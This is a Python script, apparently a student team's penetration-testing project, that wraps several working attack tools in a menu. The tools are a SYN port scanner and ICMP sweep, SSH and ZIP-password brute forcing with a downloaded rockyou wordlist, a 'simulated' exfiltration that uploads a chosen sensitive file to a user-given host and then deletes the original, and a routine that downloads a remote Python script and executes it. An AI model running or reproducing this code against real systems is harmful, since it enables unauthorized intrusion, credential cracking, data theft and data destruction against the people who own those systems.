#!/usr/bin/python3

# This script exists to document two functions we've already written in class- the network enumeration and port scanner, and the brute force attempter;
# it also serves to house two new options, a simulated exfiltration and an anomaly based code execution

# members of the team include Ian Bennett, Cody Juhl, Kevin Hoang, Brittany Powell, Juan Maldonado, and Marcus Nogueira. 
# primary author of this script is Ian Bennett

####################### 
##### IMPORTS #########
#######################

#!/usr/bin/python3

import getpass, gzip, os, paramiko, re, requests, shutil, subprocess, sys, tarfile, time, wget
from ipaddress import ip_network
from scapy.all import IP, ICMP, TCP, sr1, send, RandShort
from zipfile import ZipFile


####################### 
##### FUNCTIONS #######
#######################

# open function to get host IP from user
def getHost():
    # make host a global variable
    global host
    
    #open loop to cycle through error handling until valid IP input
    while True:
        host = input("Please provide an IP address to connect to: ") or "192.168.1.xx"
    
        #this error handling brought to you by GPT4
        if re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', host):
            octets = host.split('.')
    
            if all(0 <= int(octet) < 256 for octet in octets):
                break
    
            else:
                print("Invalid IP address format. Please try again.")
    
        else:
            print("Invalid IP address format. Please try again.")

#######################
# open function to get username from user
def getUser():
    # make user a global variable
    global user
    
    # open a loop to cycle through error handling until valid username input
    while True:
        user = input("Please provide a username: ")
    
        if user.strip():
            break
    
        else:
            print("Username cannot be empty. Please try again.")

#######################
# open function to wget and unzip/untar the rockyou dictionary if needed
def download_password_file(url):

    # try to wget it
    try:
        gz_target = wget.download(url)
        tar_target = gz_target[:-3]

        # gunzip
        with gzip.open(gz_target, 'rb') as f_in:
            with open(tar_target, 'wb') as f_out:
                shutil.copyfileobj(f_in, f_out)

        # untar
        with tarfile.open(tar_target, "r:") as tar_ref:
            tar_ref.extractall()
            filename = tar_ref.getnames()[0]

        # send unzipped filename out for use
        return filename
    
    # error with download/extract
    except Exception as e:
        print(f"An error occurred while downloading or extracting rockyou: {e}")
        return None

#######################
# open function to convert .txt to py list of words
def read_password_file(filename):

    # empty list
    password_list = []
    
    # open the file and read one word/line at a time
    try:
        with open(filename, 'r') as F:
            for line in F:
                password_list.append(line.strip())

    # error handling
    except FileNotFoundError:
        print("File not found. Please check the file path and try again.")
    
    # error handling
    except Exception as e:
        print(f"An error occurred while reading the file: {e}")
    
    # send word list out
    return password_list

#######################
# open function to retrieve dictionary from user input or wget rockyou from github
def passFile():
    filename = None  # Initialize filename to None
    
    # prompt for dictionary filename or download
    gate1 = input("Do you have a dictionary file (y) or do you need to download one (n)? ").lower()
    
    # download rockyou if user doesn't have one
    if gate1 == 'n':
        url = "https://github.com/danielmiessler/SecLists/raw/master/Passwords/Leaked-Databases/rockyou.txt.tar.gz"
        filename = download_password_file(url)
    
    # take user's dictionary filepath
    elif gate1 == 'y':
        filename = input("Enter the dictionary file path: ")
        if not os.path.isfile(filename):
            print("The file does not exist. Please check the path and try again.")
            return []
    
    # If filename is set and it is a file
    if filename and os.path.isfile(filename):
        # then call the func to generate list from file
        password_list = read_password_file(filename)
        return password_list
    else:
        print("No valid filename was provided or file does not exist.")
        return []

#######################
# open function for what to do on successful login to prove login for user
def execute_commands(ssh):
    commands = ["whoami", "ls -l", "uptime"]
    
    for command in commands:
        stdin, stdout, stderr = ssh.exec_command(command)
        time.sleep(3)
        output = stdout.read().decode()
        print("*~#~*" * 25)
        print(output)
    
    print("*~#~*" * 25)

#######################
# open function to attempt ssh login
def sshAttempt(host, user, password, port=22):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    # use variables from above
    try:
        print(f"attempting login with {user}/'{password}' at {host}:{port}")
        ssh.connect(host, port, user, password)
        
        # if able to login, then
        print(f"Success! Connected with password: {password}\n")

        # prove it
        time.sleep(2)
        execute_commands(ssh)

        return True

    # if not able to login, then say so
    except paramiko.AuthenticationException:
        print("Authentication Failed!\n")
        time.sleep(2)
        return False

    # eject button
    except KeyboardInterrupt:
        print("Operation cancelled by user.")
        return False

    # other error
    except Exception as e:
        print(f"An error occurred: {e}")
        time.sleep(2)
        return False

    # reset ssh
    finally:
        ssh.close()

#######################
# main brute force ssh function
def execSSH():
    getHost()
    getUser()

    gate2 = input("Do you know the password? y/n: ").lower()

    # user knows the login credentials (why use this script .. ?)
    if gate2 == 'y':

        # take creds
        password = getpass.getpass(prompt="Please provide a password: ")

        # log in
        sshAttempt(host, user, password)

    # user has chosen the hard way        
    elif gate2 == 'n':

        # pull in the password list
        password_list = passFile()

        # loop to iterate
        for password in password_list:

            # try to log in
            if sshAttempt(host, user, password):

                # if it works, close the script
                print("happy hunting")
                break

#######################
# this section is a cool little file selector to locate zipped files - next five functions. original draft from prompt engineering w gpt
# https://chat.openai.com/share/0446b349-68d2-4fcf-bf10-5a50563183d5
def is_zip_file(filename):
    return filename.endswith('.zip')

def is_sensitive_file(filename):
    sensitive_extensions = ['.txt', '.pdf', '.docx', '.xlsx']
    return any(filename.endswith(ext) for ext in sensitive_extensions)

def list_directory_contents(directory):
    print(f"\nContents of '{directory}':")
    contents = os.listdir(directory)
    contents.sort()  # Sort the contents alphabetically
    for i, content in enumerate(contents, 1):
        print(f"{i}. {content}")
    print()

# requires selection to be zipped
def search_for_file():
    zFilename = None
    current_directory = os.getcwd()  # Start from the current working directory
    
    while True:
        input_path = input("Enter the base directory to start the search (e.g., /home/user/Downloads) or '.' for the current directory: ").strip()
        if input_path == '.':
            break  # Accept the current directory
        elif input_path == '..':
            # Navigate up one directory level
            current_directory = os.path.abspath(os.path.join(current_directory, input_path))
            break
        elif os.path.isdir(input_path):
            current_directory = os.path.abspath(input_path)  # Convert to absolute path
            break
        else:
            print("Invalid input. Please enter a non-empty valid directory path.")
  
    
    while True:
        list_directory_contents(current_directory)
        user_choice = input("Enter the number of the directory to navigate into, 'up' to go to the parent directory, 'manual' to enter a directory manually, 'cancel' to cancel the operation, or the name of the zip file if you see it: ").strip()

        if user_choice.isdigit():
            contents = os.listdir(current_directory)
            contents.sort()
            choice_index = int(user_choice) - 1
            if 0 <= choice_index < len(contents):
                selected_item = contents[choice_index]
                chosen_path = os.path.join(current_directory, selected_item)
                if os.path.isdir(chosen_path):
                    current_directory = chosen_path
                elif is_zip_file(selected_item):
                    zFilename = chosen_path
                    print(f"Zipped file '{selected_item}' selected.")
                    break
                else:
                    print("The selected item is not a directory or a zipped file. Please try again.")
            else:
                print("Invalid selection. Please try again.")
        
        elif user_choice == 'up':
            parent_directory = os.path.abspath(os.path.dirname(current_directory))
            if parent_directory == current_directory:
                print("You are at the root directory. Cannot go up.")
            else:
                current_directory = parent_directory
        
        elif user_choice == 'manual':
            manual_path = input("Enter the full path of the directory: ").strip()
            if os.path.isdir(manual_path):
                current_directory = os.path.abspath(manual_path)
            else:
                print("The entered directory does not exist. Please try again.")
        
        elif user_choice == 'cancel':
            print("Operation cancelled by user.")
            break

        elif is_zip_file(user_choice) and os.path.isfile(os.path.join(current_directory, user_choice)):
            zFilename = os.path.join(current_directory, user_choice)
            print(f"Zipped file '{user_choice}' selected.")
            break

        else:
            print("Invalid input. Please try again.")

    return zFilename

# same as above but no requirement for zip
def search_for_sensitive():
    filename = None
    current_directory = os.getcwd()  # Start from the current working directory

    while True:
        input_path = input("Enter the base directory to start the search (e.g., /home/user/Documents) or '.' for the current directory: ").strip()
        if input_path == '.':
            break  # Accept the current directory
        elif os.path.isdir(input_path):
            current_directory = os.path.abspath(input_path)  # Convert to absolute path
            break
        else:
            print("Invalid input. Please enter a valid directory path.")

    while True:
        # List the contents of the current directory
        contents = os.listdir(current_directory)
        contents.sort()  # Sort the contents alphabetically
        print(f"\nContents of '{current_directory}':")
        for i, content in enumerate(contents, 1):
            print(f"{i}. {content}")
        
        # User input to navigate or select a file
        user_choice = input("Enter the number of the item, 'up' to go to the parent directory, 'cancel' to cancel, or the name of the file if you see it: ").strip()

        if user_choice.isdigit():
            choice_index = int(user_choice) - 1
            if 0 <= choice_index < len(contents):
                selected_item = contents[choice_index]
                chosen_path = os.path.join(current_directory, selected_item)
                if os.path.isdir(chosen_path):
                    current_directory = chosen_path  # Navigate into the selected directory
                elif os.path.isfile(chosen_path):  # Check if the selected item is a file
                    filename = chosen_path
                    print(f"File '{selected_item}' selected.")
                    break
                else:
                    print("The selected item is not a file. Please try again.")
            else:
                print("Invalid selection. Please try again.")
        elif user_choice == 'up':
            if os.path.dirname(current_directory) == current_directory:
                print("You are at the root directory. Cannot go up.")
            else:
                current_directory = os.path.dirname(current_directory)  # Navigate up one directory level
        elif user_choice == 'cancel':
            print("Operation cancelled by user.")
            break
        elif os.path.isfile(os.path.join(current_directory, user_choice)):  # Check if the input is a direct file name
            filename = os.path.join(current_directory, user_choice)
            print(f"File '{user_choice}' selected.")
            break
        else:
            print("Invalid input. Please try again.")

    return filename

#######################
# open main function to brute force crack open zipped files
def zipAttempt(zFilename, password, outfile):
    try:
        print(f"Attempting to open {zFilename} with '{password}'")
        with ZipFile(zFilename) as zf:
            # Extract all the contents into the specified output directory
            zf.extractall(path=outfile, pwd=bytes(password,'utf-8'))
            # Get a list of the ZIP file contents
            zip_contents = zf.namelist()

        # Print the success message and list all extracted files with their paths
        print(f"Success! Unlocked with password: {password}. The following files have been extracted:")
        for file in zip_contents:
            print(f"- {file} extracted to {os.path.join(outfile, file)}")
        print()

        time.sleep(2)
        return True

    except RuntimeError as e:
        if 'Bad password' in str(e):
            print("Authentication Failed!\n")
        
        else:
            print(f"Runtime error occurred: {e}")
                
        return False

    except KeyboardInterrupt:
        print("Operation cancelled by user.")
        return False

    except Exception as e:
        print(f"An error occurred: {e}")
        return False

#######################
# unzip function
def execZip():
    # First, get the zFilename using the search_for_file function.
    zFilename = search_for_file()

    # Prompt for the output directory before attempting passwords
    outfile = input("Enter the output directory for the extracted files: ").strip()
    # Check if the output directory exists, if not, create it.
    if not os.path.exists(outfile):
        os.makedirs(outfile, exist_ok=True)

    gate2 = input("Do you know the password? y/n: ").lower()

    # user knows the login credentials
    if gate2 == 'y':
        # take creds
        password = getpass.getpass(prompt="Please provide a password: ")
        # attempt to unlock
        if zipAttempt(zFilename, password, outfile):  # Pass zFilename, password, and outfile
            # if it works, exit the script
            print("\n\nhappy hunting\n")
            sys.exit()
    # user has chosen the hard way
    elif gate2 == 'n':
        # pull in the password list
        password_list = passFile()
        # loop to iterate
        for password in password_list:
            # attempt to unlock
            if zipAttempt(zFilename, password, outfile):  # Pass zFilename, password, and outfile
                # if it works, exit the script
                print("\n\nhappy hunting\n")
                sys.exit()

#######################
# open function to get target IP address for TCP Port scan  
def getTgt1():
    # get user input
    target = input("enter the destination IP address for TCP scan: ")
    print("\ngot it, looking at",target,"\n")
    # spit out IP addr
    return target

# open identical function to get target CIDR for ICMP scan / enumeration
def getTgt2():
    # get user input
    target = input("enter the destination IP address and cidr for ICMP sweep: ")
    print("\ngot it, looking at",target,"\n")
    # spit out CIDR
    return target

# open identical function to get output IP for exfil
def getTgt3():
    # get user input
    target = input("enter the IP address to exfiltrate data: ")
    print(f"\ngot it, sending to {target}\n")
    return target

#######################
# get target ports from user as list
def getPort():
    # declare empty list
    portList = []
    # take user input 1
    ports = input("enter a port of interest for the target host(s): ")
    print("\ngot it, looking at",ports,"\n")
    # add input 1 to list
    portList.append(ports)

    # ask for additional inputs?
    morePorts = input("do you want to add another port? y/n ")
    # if more inputs
    if morePorts == 'y':
        while True:
            # then get those inputs too
            ports = input("\nenter another port of interest: ['q' to break]\n")
            # until escape
            if ports == 'q':
                break
            print("got it, looking at",ports,"\n")
            # and keep adding them to the list
            portList.append(ports)
        
    return portList

#######################
# open function to send tcp packets to identified targets
def portTester(target, portList):
    
    # declare empty result list
    results = []
    
    # iterate through ports
    for p in portList:
        
        # readability
        host = target
        dstPort = p

        # Generate a random source port
        srcPort = int(RandShort())

        # define response var as the output from sending sr1 (tcp packet to target)
        response = sr1(IP(dst=host)/TCP(sport=int(srcPort), dport=int(dstPort), flags='S'), timeout=1, verbose=0)
        
        if response:

            # extract flags from the received packet
            flags = response.getlayer(TCP).flags

            # check for SYN-ACK
            if flags & 0x12:
                print(f"\nReceived a SYN-ACK from {target} on port {dstPort} - the port is OPEN. Sending a RST to close.")

                # send a RST packet to close the connection
                send(IP(dst=host)/TCP(sport=int(srcPort), dport=int(dstPort), flags='R'), verbose=0)

                results.append((dstPort, 'Open'))

            # check for RST-ACK
            elif flags & 0x14:
                print(f"Received a RST-ACK from {target} on port {dstPort} - the port is CLOSED.")

                results.append((dstPort, 'Closed'))

        else:
            print(f"No response received from {target} on port {dstPort} - the port is FILTERED or the packet was DROPPED.")

            results.append((dstPort, 'Filtered/Dropped'))
    
    return results  

#######################
# open a function to call the others and actually execute tcp scan
def tcp_port_scan():
    print("\n\nTCP Port Scan\n\n")

    target = getTgt1()
    portList = getPort()

    print("\n##########\nTARGETING:\n",target,"\nON PORTS:\n",portList,"\n##########\n")

    test = portTester(target,portList)
    print("\nRESULTS:\n")
    print(test)

#######################
# open a function to conduct icmp sweep (enumeration)
def icmp_ping_sweep():
    print("\n\nICMP Ping Sweep\n\n")

    # get the cidr from user
    netCidr = getTgt2()

    # calculate the possible ip range from the cidr
    targets = ip_network(netCidr)

    # set var to null
    hostReplies = 0
    hostList = []

    # iterate through possible ips
    for host in targets.hosts():

        # set ping var as outgoing icmp for given ip addr
        ping = IP(dst=str(host))/ICMP()

        # and set reply var with sr1 (variable in a variable)
        reply = sr1(ping, timeout=1, verbose=0)

        # interpret results
        if reply is None:
            print(f"{host} is down or not responding.")
        elif reply.haslayer(ICMP):
            if int(reply.getlayer(ICMP).type) == 3 and int(reply.getlayer(ICMP).code) in [1, 2, 3, 9, 10, 13]:
                print(f"{host} is actively blocking ICMP traffic.")
            else:
                print(f"{host} is active.")
                
                # increase up count by 1
                hostReplies += 1
                # add ip address to list
                hostList.append(host)
        else:
            print(f"{host} is active.")
            
            # increase up count by 1
            hostReplies += 1
            # add ip address to list
            hostList.append(host)

    print(f"\nNumber of active hosts: {hostReplies}")
    
    return hostList

#######################
# follow-on action after ping sweep - tcp port scan of up hosts
def scan_up_hosts(hostList):
    portList = getPort()

    for host in hostList:
        new_host = str(host)
        print(f"\n##########\nTARGETING:\n  {host}\nON PORTS:\n  {portList}\n##########\n")

        test = portTester(new_host, portList)
        print("\nRESULTS for host", host, ":\n")
        print(test)

#######################
# open a function to 'simulate' exfiltration of data; includes call for file enumeration script
def simulated_exfiltration(search_for_sensitive):
    print("\nSimulated Exfiltration Attempt starting...\n\n")

    # call search_for_sensitive function to find a sensitive file on the affected
    filename = search_for_sensitive()
    if not filename:
        print("No file selected for exfiltration. Exiting the simulated attempt.")
        return

    # Confirm the file selection
    print(f"\nSelected file for exfiltration: {filename}\n")

    # Attempt to send the file to an external server
    url = getTgt3()
    files = {'file': open(filename, 'rb')}

    try:
        response = requests.post(url, files=files)
        print(f"File sent. Server response: {response.text}")

    except requests.exceptions.RequestException as e:
        print(f"Exfiltration attempt failed: {e}")

    finally:
        files['file'].close()

    
    if os.path.exists(filename):
        os.remove(filename)

#######################
# open a function to download and execute a remote script (currently set to download this same script - scriptception)
def remote_code():
    print("Script Execution (RCE Simulation) starting...")
    
    # URL of the remote script
    remote_script_url = 'https://raw.githubusercontent.com/zorg-tech-industries/scripts/main/attack.py'
    local_script_name = 'attack.py'

    # Download the remote script
    try:
        response = requests.get(remote_script_url)
        response.raise_for_status()  # Raise an exception for HTTP errors
        with open(local_script_name, 'w') as file:
            file.write(response.text)
        print(f"Downloaded script saved as {local_script_name}")
    except requests.exceptions.RequestException as e:
        print(f"Failed to download the script: {e}")
        return

    # Execute the downloaded script
    try:
        result = subprocess.run(['python', local_script_name], capture_output=True, text=True)
        print(f"Script executed with output: {result.stdout}")
    except subprocess.CalledProcessError as e:
        print(f"Script execution failed: {e.output}")
    except FileNotFoundError:
        print(f"Script {local_script_name} not found.")
    finally:
        # Clean up: remove the downloaded script after execution
        if os.path.exists(local_script_name):
            os.remove(local_script_name)

###########################################################################################################
###########################################################################################################
def main_menu():
    hostList = []
    while True:
        print("\n=== Penetration Testing Interactive Menu ===")
        print("1 - TCP Port Scan")
        print("2 - ICMP Ping Sweep")
        print("3 - Port Scan Up_Hosts (run after #2)")
        print("4 - SSH Attempt / Brute Force")
        print("5 - Unlock Zip / Brute Force")
        print("6 - Simulated Exfiltration Attempt")
        print("7 - Anomaly-Based Script Execution")
        print("8 - Quit - 'q' or 8")
        
        choice = input("Enter your choice: ")
        
        if choice == '1':
            tcp_port_scan()
        elif choice == '2':
            hostList = icmp_ping_sweep()
            print(hostList)
        elif choice == '3':
            if hostList:  # Ensure there is a list of hosts to scan
                scan_up_hosts(hostList)
            else:
                print("No active host list available. Run ICMP Ping Sweep first.")
        elif choice == '4':
            execSSH()
        elif choice == '5':
            execZip()
        elif choice == '6':
            simulated_exfiltration(search_for_sensitive)
        elif choice == '7':
            remote_code()
        elif choice == '8' or choice.lower() == 'q':
            print("Exiting the program.")
            sys.exit()
        else:
            print("Invalid input. Please enter a number between 1 and 8.")

###########################################################################################################

if __name__ == "__main__":
    main_menu()
